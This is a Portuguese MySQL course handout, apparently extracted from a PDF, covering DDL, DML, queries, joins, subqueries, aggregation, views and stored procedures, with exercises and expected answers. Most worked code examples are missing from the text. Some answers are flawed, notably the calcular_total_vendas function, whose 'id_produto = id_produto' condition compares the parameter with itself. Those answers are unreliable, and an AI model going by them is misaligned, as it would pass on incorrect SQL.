1.3 Comandos DDL (Create, Alter, Drop) 
 
Os comandos DDL (Data Definition Language) no MySQL são usados para 
definir e gerenciar a estrutura dos objetos do banco de dados, como tabelas, 
índices e restrições. Neste capítulo, exploraremos os principais comandos DDL, 
incluindo CREATE, ALTER e DROP, e forneceremos exemplos de 
implementação para cada um. 
1. CREATE: 
O comando CREATE é usado para criar novos objetos no banco de dados, como 
tabelas, índices, visões e procedimentos armazenados. 
Exemplo de Implementação: 
 
Neste exemplo, estamos criando uma nova tabela chamada produtos com quatro 
colunas: id_produto, nome, preco e quantidade. 
2. ALTER: 
O comando ALTER é usado para modificar a estrutura de um objeto existente no 
banco de dados, como adicionar, modificar ou excluir colunas de uma tabela. 
 
Videoaula do tópico disponível no AVA: 
Videoaula 3: Criação de um banco de dados usando SQL a partir de um modelo. 

 
 
Exemplo de Implementação: 
Neste 
exemplo, estamos adicionando uma nova coluna chamada descricao à tabela 
produtos, para armazenar descrições dos produtos. 
3. DROP: 
O comando DROP é usado para excluir objetos do banco de dados, como 
tabelas, índices, visões e procedimentos armazenados. 
Exemplo de Implementação: 
 
DROP TABLE produtos; 
Neste exemplo, estamos excluindo a tabela produtos do banco de dados. 
 
 
 
 
 
1.4  Criando um banco de dados completo a partir de um modelo usando SQL 
A criação de um banco de dados a partir de um modelo é uma prática comum no 
desenvolvimento de bancos de dados relacionais. Neste capítulo, vamos 
explorar como podemos utilizar SQL para criar um banco de dados seguindo um 
modelo predefinido. 
 
1. Modelagem do Banco de Dados: 
Os comandos DDL são fundamentais para definir e gerenciar a estrutura dos objetos do banco de 
dados no MySQL. Com o comando CREATE, podemos criar novos objetos, o comando ALTER nos 
permite modificar a estrutura dos objetos existentes e o comando DROP nos permite excluir objetos 
do banco de dados. É importante usar esses comandos com cuidado para garantir a integridade dos 
dados e evitar perda de informações importantes. 

 
 
Antes de começarmos a criar o banco de dados, é importante ter um modelo de 
dados que represente a estrutura desejada do banco de dados. O modelo pode 
ser criado usando ferramentas de modelagem de bancos de dados, como o 
MySQL Workbench ou o Draw.io, e deve incluir tabelas, colunas, 
relacionamentos e restrições. 
 
2. Tradução do Modelo para SQL: 
Uma vez que tenhamos o modelo de dados pronto, podemos traduzi-lo para 
comandos SQL que criarão as tabelas e definirão as relações entre elas. 
Exemplo de Implementação: 

 
 
 
 
Neste exemplo, estamos criando duas tabelas: clientes e pedidos. A tabela 
clientes possui uma chave primária id_cliente e colunas para o nome, e-mail 
(com restrição UNIQUE) e telefone do cliente. A tabela pedidos possui uma 
chave primária id_pedido, uma chave estrangeira id_cliente que faz referência à 
tabela de clientes, e colunas para a data do pedido e o valor total. 
 
3. Execução dos Comandos SQL: 

 
 
Depois de escrever os comandos SQL, podemos executá-los em um cliente 
MySQL, como o MySQL Workbench ou o phpMyAdmin, para criar o banco de 
dados conforme definido pelo modelo. 
Exercício proposto:  
Exercício 1: Integridade Referencial 
Suponha que você tenha as seguintes tabelas em um banco de dados: 
 
Seu exercício é: 
Adicione um novo cliente à tabela clientes. 
Tente inserir um novo pedido na tabela pedidos, atribuindo-o a um cliente que 
não existe na tabela clientes. 
Execute as instruções SQL necessárias para garantir a integridade referencial. 
Exercício 2: Criação do Banco de Dados 
Suponha que você esteja iniciando um novo projeto e precise criar um banco de 
dados para armazenar informações sobre alunos e cursos em uma escola. 
Seu exercício é: 
Crie um modelo conceitual do banco de dados, identificando as entidades e os 
relacionamentos entre elas. 

 
 
Traduza o modelo conceitual em um esquema de banco de dados relacional 
usando comandos SQL. 
Inclua instruções SQL para criar pelo menos duas tabelas principais, como 
alunos e cursos, com suas respectivas colunas e restrições. 
Adicione instruções SQL para criar chaves primárias e estrangeiras, se 
necessário, para garantir a integridade dos dados. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
UNIDADE 2 SQL BÁSICO 
Na segunda unidade, exploramos as operações de manipulação de dados em 
um banco de dados MySQL, incluindo INSERT, UPDATE e DELETE. Essas 

 
 
operações são essenciais para adicionar, modificar e excluir dados de tabelas 
do banco de dados. 
OBJETIVOS DA UNIDADE 2 
• Ao final dos estudos, você deverá ser capaz de: 
• Adquirir conhecimento sobre a estrutura básica de consultas SQL. 
• Familiarizar-se com os operadores de filtro (WHERE) para recuperar 
dados específicos. 
• Aprender a ordenar resultados usando a cláusula ORDER BY. 
• Dominar as operações de manipulação de dados, como INSERT, 
UPDATE e DELETE. 
 
 

 
 
2.1 Manipulação de dados (INSERT, UPDATE, DELETE) 
 
2.1.1 Inserção de Dados (INSERT): 
A operação INSERT é usada para adicionar novos registros a uma tabela. Sua 
estrutura básica é a seguinte: 
 
• nome_da_tabela: o nome da tabela onde os dados serão inseridos. 
• (coluna1, coluna2, ...): a lista de colunas onde os dados serão inseridos. 
• VALUES (valor1, valor2, ...): os valores a serem inseridos nas colunas 
correspondentes. 
Usando o banco criado na unidade anterior seguiremos manipulando os dados 
das tabelas daquele modelo. 
Inserindo um novo cliente: 
 
Inserindo um novo pedido: 
 
Inserindo um novo produto: 
 
 
Videoaula do tópico disponível no AVA: 
Vídeo aula 4: Manipulação de dados (INSERT, UPDATE, DELETE) 

 
 
2.1.2 Atualização de Dados (UPDATE): 
A operação UPDATE é usada para modificar os registros existentes em uma 
tabela. Sintaxe básica: 
 
Atualizando o email de um cliente: 
 
Atualizando o valor total de um pedido: 
 
2.1.3 Exclusão de Dados (DELETE): 
A operação DELETE é usada para remover registros de uma tabela. Sintaxe 
básica: 
 
• nome_da_tabela: o nome da tabela onde os registros serão excluídos. 
• WHERE condição: a condição que especifica quais registros serão 
excluídos. 
Excluindo um produto do estoque: 
 
 

 
 
Excluindo um cliente e seus pedidos associados: 
 
 
 
 
Aprenda Mais:  
Inserindo Dados  
Disponível em:  
https://www.youtube.com/watch?v=NCG9niOlm40&list=PLHz_AreHm4dkBs-
795Dsgvau_ekxg8g1r&index=7 
 
2.2 Estrutura básica de uma consulta SQL 
 
Neste capítulo, exploraremos a estrutura básica de uma consulta SQL usando 
como exemplo o banco de dados que criamos anteriormente, composto pelas 
tabelas clientes, pedidos e produtos. Vamos detalhar cada exemplo e explicar a 
estrutura de consulta. 
1. Consulta Simples (SELECT): 
A operação SELECT é usada para recuperar dados de uma ou mais tabelas. 
Sua estrutura básica é a seguinte: 
 
• coluna1, coluna2, ...: as colunas que você deseja recuperar. 
Videoaula do tópico disponível no AVA: 
Video aula 5: Estrutura básica de uma consulta SQL 
As operações de manipulação de dados são fundamentais para interagir com um banco de dados 
MySQL. Com os comandos INSERT, UPDATE e DELETE, podemos adicionar, modificar e excluir dados 
das tabelas conforme necessário, mantendo assim a integridade e a precisão dos dados armazenados. 

 
 
• nome_da_tabela: o nome da tabela da qual você deseja recuperar os 
dados. 
Exemplo de Consulta Simples: 
 
 
2. Consulta com Condições (WHERE): 
A cláusula WHERE é usada para filtrar os resultados com base em uma condição 
específica. Sua estrutura básica é a seguinte: 
 
• condição: a condição que os registros devem atender para serem 
incluídos no resultado. 
Exemplo de Consulta com Condição: 
 
, 
 
 
Aprenda Mais:  
Consultas.  
Disponível 
em: 
https://www.youtube.com/watch?v=GaOlyL3Uv9M&list=PLHz_AreHm4dkBs-
795Dsgvau_ekxg8g1r&index=13 
A estrutura básica de uma consulta SQL envolve as cláusulas SELECT, FROM, WHERE e ORDER BY, 
que permitem recuperar e manipular dados de um banco de dados. Compreender essa estrutura é 
fundamental para realizar consultas eficazes e obter os resultados desejados. 

 
 
 
Consultas parte 2. 
 Disponível em: 
https://www.youtube.com/watch?v=q4hPo83-Buo&list=PLHz_AreHm4dkBs-
795Dsgvau_ekxg8g1r&index=14 
 
2.3 Operadores de filtro (WHERE) 
 
2.3.1 Operadores de Filtro (WHERE) 
Neste capítulo, abordaremos os operadores de filtro SQL utilizando como 
exemplo o banco de dados composto pelas tabelas clientes, pedidos e produtos. 
Exploraremos vários filtros e detalharemos sua estrutura, fornecendo exemplos 
práticos de consultas. 
1. Operador de Igualdade (=): 
O operador de igualdade é usado para filtrar os registros que possuem um valor 
específico em uma coluna. Sua estrutura básica é a seguinte: 
 
Exemplo de Uso: 
 
Esta consulta retorna todos os pedidos feitos pelo cliente com o ID igual a 1. 
 
Videoaula do tópico disponível no AVA: 
Video aula 6: Operadores de filtro (WHERE) 

 
 
2. Operador de Diferente (!= ou <>): 
 
O operador de diferente é usado para filtrar os registros que não possuem um 
valor específico em uma coluna. Sua estrutura básica é semelhante ao operador 
de igualdade: 
 
Exemplo de Uso: 
 
Esta consulta retorna todos os clientes cujo ID não é igual a 1. 
 
3. Operadores Lógicos (AND, OR): 
Os operadores lógicos são usados para combinar múltiplas condições em uma 
cláusula WHERE. Por exemplo: 
• O operador AND retorna registros que atendem a todas as condições 
especificadas. 
• O operador OR retorna registros que atendem a pelo menos uma das 
condições especificadas. 
Exemplo de Uso: 
 
Esta consulta retorna todos os pedidos feitos pelo cliente com ID igual a 1 e com 
um valor total superior a 100. 
 

 
 
 
 
 
Exercício proposto: 
Exercícios: Operadores de Filtro (WHERE) 
Exercício 1: Escreva uma consulta SQL para recuperar todos os clientes que têm 
mais de 30 anos. 
Exercício 2: Escreva uma consulta SQL para recuperar todos os pedidos feitos 
após 01 de janeiro de 2023. 
Exercício 3: Escreva uma consulta SQL para recuperar todos os produtos com 
um preço superior a R$ 50,00 e uma quantidade em estoque inferior a 50 
unidades. 
Respostas esperadas: 
1) SELECT * 
FROM clientes 
WHERE idade > 30; 
2) SELECT * 
FROM pedidos 
WHERE data_pedido > '2023-01-01'; 
 
3) SELECT * 
FROM produtos 
WHERE preco > 50.00 AND quantidade_estoque < 50; 
 
2.3.2 Outros Operadores 
1. Operador BETWEEN: 
O operador BETWEEN é usado para selecionar valores dentro de um intervalo 
específico. Sua estrutura básica é a seguinte: 
Os operadores de filtro WHERE são fundamentais para a criação de consultas SQL específicas que 
retornam os dados desejados de um banco de dados. Compreender a estrutura e o uso desses 
operadores é essencial para realizar consultas eficazes e obter resultados precisos. 

 
 
 
Exemplo de Uso: 
 
 
Esta consulta retorna todos os pedidos feitos durante o ano de 2023. 
 
2. Operadores de Comparação (> , < , >= , <=): 
Além do operador BETWEEN, temos os operadores de comparação padrão para 
verificar se um valor é maior, menor, maior ou igual, ou menor ou igual a outro 
valor. 
Exemplo de Uso: 
 
Esta consulta retorna todos os produtos com preço superior a R$ 50,00. 
 
3. Operador IN: 
O operador IN é usado para verificar se um valor está presente em um conjunto 
específico de valores. Sua estrutura básica é a seguinte: 
 

 
 
Exemplo de Uso: 
 
Esta consulta retorna todos os clientes que têm o tipo 'Premium' ou 'VIP'. 
 
4. Operador LIKE: 
O operador LIKE é usado para pesquisar por padrões em uma coluna de texto. 
Ele pode ser combinado com o caractere % para representar zero ou mais 
caracteres, ou _ para representar um único caractere. 
 
Exemplo de Uso: 
 
Exercícios: 
Operadores de Filtro (WHERE) 
Exercício 1: Escreva uma consulta SQL para recuperar todos os pedidos feitos 
entre 01 de janeiro de 2022 e 31 de dezembro de 2022. 
Exercício 2: Escreva uma consulta SQL para recuperar todos os clientes que têm 
entre 25 e 40 anos de idade. 
Exercício 3: Escreva uma consulta SQL para recuperar todos os produtos cujo 
preço está entre R$ 100,00 e R$ 200,00. 
Exercício 4: Escreva uma consulta SQL para recuperar todos os clientes que são 
do tipo 'Premium' ou 'VIP'. 
Exercício 5: Escreva uma consulta SQL para recuperar todos os produtos cujo 
nome começa com a letra 'A'. 

 
 
Respostas Esperadas: 
 
Exercício 1: 
SELECT * 
FROM pedidos 
WHERE data_pedido BETWEEN '2022-01-01' AND '2022-12-31'; 
Exercício 2: 
SELECT * 
FROM clientes 
WHERE idade BETWEEN 25 AND 40; 
Exercício 3: 
SELECT * 
FROM produtos 
WHERE preco BETWEEN 100.00 AND 200.00; 
Exercício 4: 
SELECT * 
FROM clientes 
WHERE tipo IN ('Premium', 'VIP'); 
Exercício 5: 
SELECT * 
FROM produtos 
WHERE nome LIKE 'A%'; 
 
 
Estes exercícios permitem praticar o uso dos diferentes operadores de filtro WHERE em consultas SQL, 
aplicando diversas condições para recuperar dados específicos do banco de dados. 

 
 
Aprenda Mais:  
Consultas parte 3.  
Disponível em: 
 https://www.youtube.com/watch?v=ocyVJ9gRUaE&list=PLHz_AreHm4dkBs-
795Dsgvau_ekxg8g1r&index=15 
 
 
 
2.4 Ordenação de resultados (ORDER BY) 
 
2.4.1 Ordenação de Resultados (ORDER BY) 
Neste capítulo, exploraremos a cláusula ORDER BY, que é usada para 
classificar os resultados de uma consulta SQL. Continuaremos utilizando o 
mesmo banco de dados composto pelas tabelas clientes, pedidos e produtos, e 
detalharemos sua estrutura e exemplos de uso. 
1. Ordenação Ascendente: 
A cláusula ORDER BY pode ser usada para classificar os resultados em ordem 
ascendente. Sua estrutura básica é a seguinte: 
 
Exemplo de Uso: 
 
 
Videoaula do tópico disponível no AVA: 
Video aula 7: Ordenação de resultados (ORDER BY) 
 

 
 
Esta consulta retorna todos os clientes ordenados em ordem alfabética pelo 
nome. 
2. Ordenação Descendente: 
Também é possível ordenar os resultados em ordem descendente usando o 
modificador DESC. Por exemplo: 
 
Esta consulta retorna todos os produtos ordenados em ordem decrescente pelo 
preço. 
 
3. Ordenação por Múltiplas Colunas: 
 
É possível ordenar os resultados por múltiplas colunas, aplicando uma ordem de 
prioridade. Por exemplo: 
 
Esta consulta retorna todos os pedidos ordenados em ordem crescente pela data 
do pedido e, em seguida, em ordem decrescente pelo valor total. 
 
Exercícios: 
Exercício 1: Escreva uma consulta SQL para recuperar todos os clientes 
ordenados por idade em ordem descendente. 
Exercício 2: Escreva uma consulta SQL para recuperar todos os produtos 
ordenados por quantidade em estoque em ordem ascendente. 
Exercício 3: Escreva uma consulta SQL para recuperar todos os pedidos 
ordenados pela data do pedido em ordem descendente. 

 
 
Respostas Esperadas 
 
Exercício 1: 
SELECT * 
FROM clientes 
ORDER BY idade DESC; 
Exercício 2: 
SELECT * 
FROM produtos 
ORDER BY quantidade_estoque ASC; 
Exercício 3: 
SELECT * 
FROM pedidos 
ORDER BY data_pedido DESC; 
 
 
 
Aprenda Mais:  
Order by de várias formas  
Disponível em: https://www.youtube.com/watch?v=cerkGuFNPGY 
 
 
 
Estes exercícios permitem praticar o uso da cláusula ORDER BY para 
ordenar os resultados de uma consulta SQL de acordo com critérios 
específicos. 
 

 
 
UNIDADE 3 SQL INTERMEDIÁRIO 
 
OBJETIVOS DA UNIDADE 3  
Ao final dos estudos, você deverá ser capaz de: 
• Explorar técnicas avançadas de consultas SQL, incluindo junções 
(INNER JOIN, LEFT JOIN, RIGHT JOIN) para combinar dados de 
múltiplas tabelas. 
• Dominar o uso de subconsultas (Subquery) para realizar consultas 
mais complexas. 
• Compreender o uso do GROUP BY e funções de agregação (SUM, 
AVG, COUNT, etc.) para resumir dados. 
• Utilizar Views para simplificar consultas complexas e melhorar a 
manutenibilidade do código SQL. 
 
 
 

 
 
3.1 Junções (INNER JOIN, LEFT JOIN, RIGHT JOIN) 
 
Neste capítulo, vamos explorar as junções em SQL, incluindo INNER JOIN, 
LEFT JOIN e RIGHT JOIN. Continuaremos utilizando o mesmo banco de dados 
composto pelas tabelas clientes, pedidos e produtos. 
 
1. INNER JOIN: 
A junção INNER JOIN é usada para combinar linhas de duas ou mais tabelas 
com base em uma condição especificada. Sua estrutura básica é a seguinte: 
 
Exemplo de Uso: 
 
Esta consulta retorna o nome do cliente e o valor total de cada pedido 
correspondente. 
 
2. LEFT JOIN: 
A junção LEFT JOIN retorna todas as linhas da tabela à esquerda (tabela1) e as 
linhas correspondentes da tabela à direita (tabela2). Se não houver 
correspondência, são retornados valores NULL para as colunas da tabela à 
direita. Sua estrutura é similar à do INNER JOIN. 
 
Exemplo de Uso: 
Videoaula do tópico disponível no AVA: 
Videoaula 9: Junções (INNER JOIN, LEFT JOIN, RIGHT JOIN) 
n- 
 

 
 
Esta consulta retorna todos os clientes, incluindo aqueles que não fizeram 
nenhum pedido. Se um cliente não tiver nenhum pedido correspondente, o 
valor_total será NULL. 
 
3. RIGHT JOIN: 
A junção RIGHT JOIN é semelhante ao LEFT JOIN, mas retorna todas as linhas 
da tabela à direita (tabela2) e as linhas correspondentes da tabela à esquerda 
(tabela1). Se não houver correspondência, são retornados valores NULL para as 
colunas da tabela à esquerda. Sua estrutura é similar à do INNER JOIN. 
 
Exemplo de Uso: 
 
Esta consulta retorna todos os pedidos, incluindo aqueles sem um cliente 
correspondente. Se um pedido não tiver um cliente correspondente, o nome do 
cliente será NULL. 
 
 
Aprenda Mais:   
Inner Join com várias tabelas 
 Disponível em:  
https://www.youtube.com/watch?v=jx2ne8iZMOA&list=PLHz_AreHm4dkBs-
795Dsgvau_ekxg8g1r&index=18 
As junções INNER JOIN, LEFT JOIN e RIGHT JOIN são ferramentas 
poderosas para combinar dados de múltiplas tabelas em consultas SQL. 
Compreender suas diferenças e saber quando usá-las é essencial para 
manipular eficientemente dados relacionais em um banco de dados. 

 
 
Exercícios: Junções (INNER JOIN, LEFT JOIN, RIGHT JOIN) 
 
Exercício 1: Escreva uma consulta SQL que retorne o nome do cliente e o nome 
do produto de cada pedido. 
Exercício 2: Escreva uma consulta SQL que retorne todos os clientes, 
juntamente com o valor total de todos os pedidos feitos por cada cliente. 
Exercício 3: Escreva uma consulta SQL que retorne todos os pedidos, incluindo 
aqueles que não têm um cliente correspondente. 
 
Respostas esperadas: 
Exercício 1: 
SELECT 
clientes.nome 
AS 
nome_cliente, 
produtos.nome 
AS 
nome_produto 
FROM clientes 
INNER JOIN pedidos ON clientes.id_cliente = pedidos.id_cliente 
INNER JOIN produtos ON pedidos.id_produto = produtos.id_produto; 
Exercício 2: 
SELECT clientes.nome, SUM(pedidos.valor_total) AS total_pedidos 
FROM clientes 
LEFT JOIN pedidos ON clientes.id_cliente = pedidos.id_cliente 
GROUP BY clientes.nome; 
Exercício 3: 
SELECT 
pedidos.id_pedido, 
clientes.nome 
AS 
nome_cliente, 
pedidos.valor_total 
FROM pedidos 
LEFT JOIN clientes ON pedidos.id_cliente = clientes.id_cliente; 
 

 
 
3.2 Subconsultas (Subquery) 
 
Neste capítulo, vamos explorar o uso de subconsultas em SQL. Uma 
subconsulta é uma consulta aninhada dentro de outra consulta SQL. 
Continuaremos utilizando o mesmo banco de dados composto pelas tabelas 
clientes, pedidos e produtos. 
 
1. Subconsulta na Cláusula WHERE: 
As subconsultas podem ser usadas na cláusula WHERE para filtrar os resultados 
com base em uma condição proveniente de outra consulta. Por exemplo: 
Esta 
consulta retorna o nome de todos os clientes que fizeram pelo menos um pedido. 
 
2. Subconsulta na Cláusula FROM: 
As subconsultas também podem ser usadas na cláusula FROM para fornecer 
dados temporários para a consulta principal. Por exemplo: 
Esta consulta retorna a média do valor total de todos os pedidos feitos por cliente. 
 
3. Subconsulta na Cláusula SELECT: 
As subconsultas podem ser usadas na cláusula SELECT para calcular valores 
ou fornecer informações adicionais. Por exemplo: 
Videoaula do tópico disponível no AVA: 
Videoaula 10: Subconsultas (Subquery) 
n- 
 

 
 
Esta consulta retorna o nome de cada cliente juntamente com o número total de 
pedidos feitos por cliente. 
Exercícios: Subconsultas (Subquery) 
 
Exercício 1: Escreva uma consulta SQL para recuperar o nome de todos os 
clientes que fizeram pedidos de produtos com um preço superior a R$ 500,00. 
Exercício 2: Escreva uma consulta SQL para recuperar o nome de todos os 
clientes que fizeram mais de dois pedidos. 
Exercício 3: Escreva uma consulta SQL para recuperar o nome e o preço do 
produto mais caro em todo o banco de dados. 
 
Respostas esperadas: 
 
Exercício 1: 
SELECT nome 
FROM clientes 
WHERE id_cliente IN (SELECT id_cliente FROM pedidos WHERE 
id_produto IN (SELECT id_produto FROM produtos WHERE preco > 
500.00)); 
 
 
 
Exercício 2: 
SELECT nome 
FROM clientes 

 
 
WHERE id_cliente IN (SELECT id_cliente FROM pedidos GROUP BY 
id_cliente HAVING COUNT(*) > 2); 
Exercício 3: 
SELECT nome, preco 
FROM produtos 
WHERE preco = (SELECT MAX(preco) FROM produtos); 
 
3.3 Group By e Funções Agregação (SUM, AVG, COUNT, etc.) 
 
Neste capítulo, exploraremos o uso da cláusula GROUP BY e funções de 
agregação como SUM, AVG e COUNT em consultas SQL. Continuaremos 
utilizando o mesmo banco de dados composto pelas tabelas clientes, pedidos e 
produtos. 
1. Group By: 
A cláusula GROUP BY é usada para agrupar linhas que têm o mesmo valor em 
uma ou mais colunas. Por exemplo: 
 
Esta 
consulta retorna o número de produtos em cada categoria. 
 
2. Funções de Agregação: 
As funções de agregação, como SUM, AVG e COUNT, são usadas para realizar 
cálculos em um conjunto de valores. Por exemplo: 
Videoaula do tópico disponível no AVA: 
Videoaula 11: Group By e Funções de Agregação (SUM, AVG, COUNT, etc.) 
n- 
 

 
 
 
Esta 
consulta retorna o preço médio de todos os produtos. 
 
3. Group By com Funções de Agregação: 
 
As funções de agregação podem ser combinadas com a cláusula GROUP BY 
para calcular valores agregados para grupos de linhas. Por exemplo: 
 
 
Esta consulta retorna o número de pedidos e o total gasto por cada cliente. 
 
Exercícios: Group By e Funções de Agregação 
Exercício 1: Escreva uma consulta SQL que retorne o número de pedidos feitos 
por cada cliente. 
Exercício 2: Escreva uma consulta SQL que retorne o total gasto em cada 
pedido. 
Exercício 3: Escreva uma consulta SQL que retorne a categoria de produto com 
o preço médio mais alto. 
 
Respostas Esperadas 
Exercício 1: 
SELECT id_cliente, COUNT(*) AS num_pedidos 
FROM pedidos 
GROUP BY id_cliente; 

 
 
Exercício 2: 
SELECT id_pedido, SUM(valor_total) AS total_gasto 
FROM pedidos 
GROUP BY id_pedido; 
Exercício 3: 
SELECT categoria, AVG(preco) AS preco_medio 
FROM produtos 
GROUP BY categoria 
ORDER BY preco_medio DESC 
LIMIT 1; 
 
 
3.4 Utilização de Views para simplificação de consultas complexas 
 
Neste capítulo, vamos explorar o uso de Views em SQL para simplificar 
consultas complexas e facilitar o acesso aos dados. Uma View é uma consulta 
SQL armazenada no banco de dados e tratada como uma tabela virtual. 
1. Criação de Views: 
As Views são criadas usando a cláusula CREATE VIEW. Por exemplo: 
 
Esta View permite acessar os detalhes dos pedidos juntamente com o nome do 
cliente. 
Videoaula do tópico disponível no AVA: 
Videoaula 12: Utilização de Views para simplificação de consultas complexas. 
n- 
 

 
 
 
2. Utilização de Views: 
Uma vez criada, uma View pode ser consultada como uma tabela normal. Por 
exemplo: 
  
Esta consulta retorna todos os pedidos juntamente com os nomes dos clientes. 
 
3. Atualização de Views: 
As Views podem ser atualizadas usando a cláusula CREATE OR REPLACE 
VIEW. Por exemplo: 
 
Esta instrução atualiza a View vw_pedidos_cliente para incluir o endereço dos 
clientes. 
Aprenda Mais:   
Diferenças entre views e tabelas no banco de dados. 
 Disponível em: https://www.youtube.com/watch?v=MOXHM8tdiYU 
 
 
 
 
 
 

 
 
UNIDADE 4 STORED PROCEDURES E FUNCTIONS 
 
Nesta unidade, vamos abordar os princípios essenciais das funções mais 
avançadas de bancos de dados que podem ser consideradas verdadeiros 
algoritmos usando linguagem SQL. 
 
OBJETIVOS DA UNIDADE 4  
• Ao final dos estudos, você deverá ser capaz de: 
• Entender os conceitos e vantagens das Stored Procedures e 
Functions. 
• Dominar a sintaxe para criação de Procedures e Functions, incluindo 
parâmetros de entrada e saída. 
• Aplicar os conceitos em cenários reais para automatizar tarefas e 
melhorar a eficiência do sistema. 
 
 
 

 
 
4.1 Stored Procedures e Functions 
 
Neste capítulo, exploraremos os conceitos, vantagens e uso prático de Stored 
Procedures e Functions em bancos de dados relacionais. 
1. Conceitos: 
• Stored Procedures e Functions são blocos de código SQL armazenados 
no banco de dados para execução posterior. 
• Stored Procedures: São conjuntos de instruções SQL que podem realizar 
operações complexas, como inserções, atualizações e exclusões de 
dados, além de lógica de programação como loops e condicionais. 
• Functions: São rotinas que retornam um valor escalar baseado em 
parâmetros de entrada, sendo úteis para cálculos repetitivos ou 
operações comuns. 
 
2. Vantagens: 
 
• Reutilização de Código: Stored Procedures e Functions permitem 
encapsular lógica de negócios complexa, facilitando a reutilização em 
várias partes do sistema. 
• Melhoria de Desempenho: Ao serem armazenados no banco de dados, 
Stored Procedures e Functions podem ser compilados e otimizados, 
resultando em melhor desempenho de consulta. 
• Segurança: As Stored Procedures podem controlar o acesso aos dados, 
permitindo aos usuários executar apenas operações específicas. 
 
Aprenda Mais:   
Usos 
de 
Procedures. 
Disponível 
em: 
https://www.youtube.com/watch?v=lHE5i7sbhhU 
Videoaula do tópico disponível no AVA: 
Videoaula 13: Stored Procedures e Functions  Conceitos e vantagens. 
 
 
 
 
 
 

 
 
4.2 Sintaxe para criação de Procedures e Functions 
 
Neste capítulo, vamos aprofundar na sintaxe para criação de Stored Procedures 
e Functions em SQL, detalhando seu uso e fornecendo exemplos práticos. 
 
1. Sintaxe para Criação de Procedures: 
A sintaxe básica para criar uma Stored Procedure em SQL é a seguinte: 
 
Os parâmetros são opcionais e podem ser utilizados para passar valores para 
dentro da Procedure. O corpo da Procedure contém as instruções SQL que serão 
executadas quando a Procedure for chamada. 
 
Exemplo de Procedure: 
Vamos criar uma Stored Procedure simples que retorna o número total de 
clientes: 
  
 
2. Sintaxe para Criação de Functions: 
A sintaxe para criar uma Function em SQL é semelhante à sintaxe de uma 
Procedure: 
Videoaula do tópico disponível no AVA: 
Videoaula 14: Sintaxe para criação de Procedures e Functions 
 
 
 
 
 
 

 
 
A diferença principal é que uma Function deve ter um tipo de retorno definido, 
indicado pelo RETURNS. 
 
Exemplo de Function: 
Vamos criar uma Function que calcula o valor total de um pedido, dado o ID do 
pedido: 
 
 
 
 
Agora, vamos aos exercícios! 
 
 
 
Exercícios: Procedures e Functions 
 
Exercício 1: Stored Procedure para Inserir um Novo Cliente 
Crie uma Stored Procedure chamada inserir_cliente que receba como 
parâmetros o nome, email e telefone de um cliente e insira esses dados na tabela 
de clientes. 
 
Exercício 2: Function para Calcular o Total de Vendas de um Produto 
Crie uma Function chamada calcular_total_vendas que receba como parâmetro 
o ID de um produto e retorne o total de vendas desse produto. 
 
Stored Procedures e Functions são recursos essenciais em bancos de dados 
relacionais, oferecendo flexibilidade e reutilização de código. Ao compreender a 
sintaxe para criar esses objetos no banco de dados, é possível aproveitar ao 
máximo seu potencial em diferentes cenários de aplicação. 
 

 
 
Respostas esperadas 
 
Exercício 1: 
CREATE PROCEDURE inserir_cliente(nome VARCHAR(255), email 
VARCHAR(255), telefone VARCHAR(20)) 
BEGIN 
    INSERT INTO clientes (nome, email, telefone) VALUES (nome, email, 
telefone); 
END; 
 
Exercício 2: 
CREATE FUNCTION calcular_total_vendas(id_produto INT) RETURNS 
DECIMAL(10,2) 
BEGIN 
    DECLARE total_vendas DECIMAL(10,2); 
    SELECT SUM(valor_total) INTO total_vendas FROM pedidos WHERE 
id_produto = id_produto; 
    RETURN total_vendas; 
END; 
 
 
 
 
 
 
 
 

 
 
4.3 Parâmetros de entrada e saída 
 
Neste capítulo, exploraremos como definir e utilizar parâmetros de entrada e 
saída em Stored Procedures e Functions em bancos de dados relacionais. 
1. Parâmetros de Entrada: 
Os parâmetros de entrada são utilizados para passar valores para dentro de uma 
Stored Procedure ou Function durante sua execução. Eles são especificados na 
declaração da Procedure ou Function e podem ser utilizados dentro do seu 
corpo. 
Sintaxe para Parâmetros de Entrada: 
 
Exemplo de Procedure com Parâmetros de Entrada: 
  
 
2. Parâmetros de Saída: 
 
Os parâmetros de saída são utilizados para retornar valores de uma Stored 
Procedure ou Function para o código que a chamou. Eles são definidos como 
variáveis de saída e podem ser utilizados para transmitir informações de volta 
para o código cliente. 
Sintaxe para Parâmetros de Saída: 
  
Videoaula do tópico disponível no AVA: 
Videoaula 15: Parâmetros de entrada e saída 
 
 
 
 
 
 
 

 
 
Exemplo de Procedure com Parâmetros de Saída: 
 
  
 
3. Uso Prático: 
Os parâmetros de entrada e saída proporcionam uma maneira poderosa de 
interagir com Procedures e Functions, permitindo que elas recebam dados e 
retornem resultados de forma dinâmica e flexível. 
 
 
4.4 Uso prático em cenários reais 
 
Neste capítulo, exploraremos exemplos práticos de como utilizar Stored 
Procedures e Functions em cenários reais de aplicação em bancos de dados 
relacionais. 
 
1. Automatização de Tarefas Recorrentes: 
 
Stored Procedures são frequentemente utilizadas para automatizar tarefas 
recorrentes que envolvem manipulação de dados. Por exemplo, uma 
Procedure pode ser criada para realizar backups regulares do banco de dados, 
executar rotinas de manutenção ou enviar notificações automáticas. 
 
Exemplo: Backup Automático do Banco de Dados 
 
Videoaula do tópico disponível no AVA: 
Videoaula 16 Uso prático em cenários reais. 
 
 
 
 
 
 
 

 
 
  
 
 
2. Implementação de Regras de Negócio Complexas: 
 
Stored Procedures e Functions podem ser utilizadas para implementar regras 
de negócio complexas diretamente no banco de dados. Isso permite que a 
lógica de negócio seja centralizada e executada de forma consistente em todas 
as interações com o banco de dados. 
 
Exemplo: Validação de Dados ao Inserir um Pedido 
 
 
 
3. Otimização de Desempenho: 
 
Stored Procedures e Functions podem ser utilizadas para otimizar o 
desempenho de consultas e operações no banco de dados. Ao encapsular 
consultas complexas ou cálculos repetitivos em Procedures ou Functions, é 
possível reduzir a sobrecarga de rede e melhorar o tempo de resposta das 
consultas. 
 
Exemplo: Function para Calcular o Total de Vendas de um Produto 
 
  
 
 
Exercícios: 
 
Exercício 1: Implementação de Regra de Negócio 
 

 
 
Crie uma Stored Procedure chamada inserir_pedido que valida se o total do 
pedido é maior que zero antes de inseri-lo na tabela de pedidos. Caso o total 
seja zero ou negativo, a Procedure deve retornar uma mensagem de erro. 
 
Exercício 2: Otimização de Consulta 
 
Crie uma Function chamada calcular_total_vendas que recebe o ID de um 
produto como parâmetro e retorna o total de vendas desse produto. Esta 
